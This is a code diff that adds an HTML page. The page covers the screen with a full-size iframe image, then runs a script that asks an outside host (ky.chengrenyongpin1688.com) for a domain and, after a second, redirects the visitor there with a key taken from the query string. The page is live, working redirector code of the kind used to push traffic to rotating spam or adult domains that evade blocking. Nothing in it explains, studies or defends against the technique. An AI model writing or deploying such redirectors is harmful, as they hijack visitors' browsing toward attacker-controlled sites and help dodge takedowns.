@@ -1,0 +1,43 @@
+
+
+	<iframe style="position: fixed; left: 0; top: 0px; height: 100%; width: 100%; z-index: 9999;" scrolling="yes" frameborder="0" src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=1317131963,4117209591&fm=26&gp=0.jpg"></iframe>
+
+<script>
+    console.log(111);
+    query = window.location.search.substring(1);
+    var index = query.indexOf("@") + 1;
+    var key = query.substring(index);
+    // url =  "http://r1k.kie83a.top" + key
+    var xmlhttp;
+    if (window.XMLHttpRequest)
+    {
+        //  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码
+        xmlhttp=new XMLHttpRequest();
+    }
+    else
+    {
+        // IE6, IE5 浏览器执行代码
+        xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
+    }
+    var url = '';
+    xmlhttp.onreadystatechange=function()
+    {
+        if (xmlhttp.readyState==4 && xmlhttp.status==200)
+        {
+
+            var result = xmlhttp.responseText;
+            
+               
+                a = "http://"+result + key;
+var a = a.replace(/<[^>]+>/g,"")
+        // alert(a);
+                console.log(a);
+				setTimeout(function(){
+                location.href = a;
+            },1000)
+            
+        }
+    };
+    xmlhttp.open("GET","http://ky.chengrenyongpin1688.com/api/index/domain",true);
+    xmlhttp.send();
+</script>
